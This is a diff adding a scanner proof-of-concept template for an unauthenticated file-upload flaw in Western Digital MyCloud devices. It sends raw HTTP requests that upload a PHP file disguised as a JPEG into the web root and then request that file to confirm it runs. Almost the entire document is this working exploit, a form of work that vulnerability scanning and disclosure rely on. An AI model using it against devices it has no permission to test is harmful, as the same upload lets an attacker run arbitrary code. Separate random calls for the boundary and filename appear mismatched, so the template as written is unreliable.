@@ -1,0 +1,54 @@
+id: poc-yaml-western-digital-mycloud-multi-uploadify-file-upload
+
+info:
+  name: poc-yaml-western-digital-mycloud-multi-uploadify-file-upload
+  author: sharecast
+  severity: critical
+  tags: xray-converted,fileupload,ct-416681
+  reference:
+    - https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29
+
+http:
+  - raw:
+      - |
+        GET /web/jquery/uploader/multi_uploadify.php?status=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "status=1"
+  - raw:
+      - |
+        POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="Filedata[]"; filename="{{rand_base(8)}}.php"
+        Content-Type: image/jpeg
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
